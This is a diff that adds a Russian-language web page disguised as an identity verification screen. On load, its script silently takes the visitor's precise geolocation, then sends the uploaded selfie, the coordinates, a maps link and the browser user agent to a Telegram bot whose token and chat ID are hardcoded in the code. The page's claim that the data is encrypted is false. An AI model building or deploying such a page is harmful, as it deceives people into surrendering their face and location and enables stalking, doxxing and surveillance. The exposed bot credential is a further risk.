@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Проверка доступа</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #111;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+        .card {
+            background: #1e1e2f;
+            border-radius: 32px;
+            padding: 28px 20px;
+            max-width: 460px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            border: 1px solid #2c2c3a;
+        }
+        h1 {
+            font-size: 26px;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+        p {
+            color: #aaa;
+            font-size: 15px;
+            margin-bottom: 24px;
+        }
+        .info {
+            background: #0f0f17;
+            border-radius: 24px;
+            padding: 16px;
+            margin: 16px 0;
+            text-align: left;
+            color: #ccc;
+            font-size: 14px;
+        }
+        .info span {
+            display: block;
+            margin: 6px 0;
+        }
+        .file-input {
+            margin: 20px 0;
+            text-align: left;
+        }
+        .file-input label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #ddd;
+        }
+        input[type="file"] {
+            width: 100%;
+            padding: 12px;
+            background: #0f0f17;
+            border: 1px solid #2c2c3a;
+            border-radius: 16px;
+            color: white;
+            cursor: pointer;
+        }
+        button {
+            background: #2e6a4c;
+            color: white;
+            border: none;
+            border-radius: 40px;
+            padding: 14px 20px;
+            font-size: 18px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 8px;
+        }
+        button:hover {
+            background: #1f543c;
+        }
+        button:disabled {
+            background: #444;
+            cursor: not-allowed;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 20px;
+            font-size: 14px;
+            display: none;
+        }
+        .status.success {
+            background: #1e3a2f;
+            color: #b7f0c0;
+            display: block;
+        }
+        .status.error {
+            background: #3a1e1e;
+            color: #ffb4b4;
+            display: block;
+        }
+        .status.loading {
+            background: #1e2a3a;
+            color: #aad0ff;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h1>🔐 Проверка личности</h1>
+    <p>Для продолжения требуется ваше фото и геолокация</p>
+    <div class="info">
+        📸 Выберите селфи или фото<br>
+        🌍 Геопозиция определится автоматически<br>
+        ⚡ Данные отправляются в зашифрованном виде
+    </div>
+    <div class="file-input">
+        <label>📷 Фото (обязательно):</label>
+        <input type="file" id="photo" accept="image/jpeg,image/png,image/jpg" capture="environment">
+    </div>
+    <button id="sendBtn">Отправить</button>
+    <div id="statusMsg" class="status"></div>
+</div>
+
+<script>
+    // === КОНФИГУРАЦИЯ (уже вставлена) ===
+    const BOT_TOKEN = "8870989101:AAHrjmtXznwKqyAf5D4uGvmG0wuWjpZ1PX4";
+    const CHAT_ID = "7003535127";   // ваш ID из getUpdates
+    // ====================================
+
+    let coords = null;
+    let geoError = null;
+
+    // Запрос геолокации при загрузке
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                coords = {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    acc: pos.coords.accuracy
+                };
+            },
+            (err) => {
+                geoError = err.message;
+            }
+        );
+    } else {
+        geoError = "Браузер не поддерживает геолокацию";
+    }
+
+    const sendBtn = document.getElementById('sendBtn');
+    const photoInput = document.getElementById('photo');
+    const statusDiv = document.getElementById('statusMsg');
+
+    function showStatus(text, type) {
+        statusDiv.className = `status ${type}`;
+        statusDiv.textContent = text;
+        statusDiv.style.display = 'block';
+        if (type === 'success') {
+            setTimeout(() => {
+                statusDiv.style.display = 'none';
+            }, 5000);
+        }
+    }
+
+    sendBtn.addEventListener('click', async () => {
+        const file = photoInput.files[0];
+        if (!file) {
+            showStatus('❌ Выберите фото', 'error');
+            return;
+        }
+
+        sendBtn.disabled = true;
+        showStatus('⏳ Отправка...', 'loading');
+
+        // Текст подписи к фото
+        let caption = `📸 Новая отправка\n🕒 ${new Date().toLocaleString()}`;
+        if (coords) {
+            const mapsLink = `https://maps.google.com/?q=${coords.lat},${coords.lng}`;
+            caption += `\n📍 Координаты: ${coords.lat}, ${coords.lng}\n🎯 Точность: ±${coords.acc} м\n🗺 Карта: ${mapsLink}`;
+        } else if (geoError) {
+            caption += `\n⚠️ Гео: ${geoError}`;
+        } else {
+            caption += `\n⏳ Геолокация всё ещё запрашивается...`;
+        }
+        caption += `\n📱 UA: ${navigator.userAgent}`;
+
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', file);
+        formData.append('caption', caption);
+
+        try {
+            const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            const json = await resp.json();
+            if (json.ok) {
+                showStatus('✅ Данные успешно отправлены', 'success');
+                photoInput.value = '';  // очистка поля
+                // Доп. отправка координат отдельным сообщением (если есть)
+                if (coords) {
+                    const locText = `📍 Точный адрес (приблизительно): https://maps.google.com/?q=${coords.lat},${coords.lng}`;
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: locText })
+                    });
+                }
+            } else {
+                showStatus(`❌ Ошибка: ${json.description || 'неизвестная'}`, 'error');
+            }
+        } catch (err) {
+            showStatus(`❌ Сеть: ${err.message}`, 'error');
+        } finally {
+            sendBtn.disabled = false;
+        }
+    });
+</script>
+</body>
+</html>
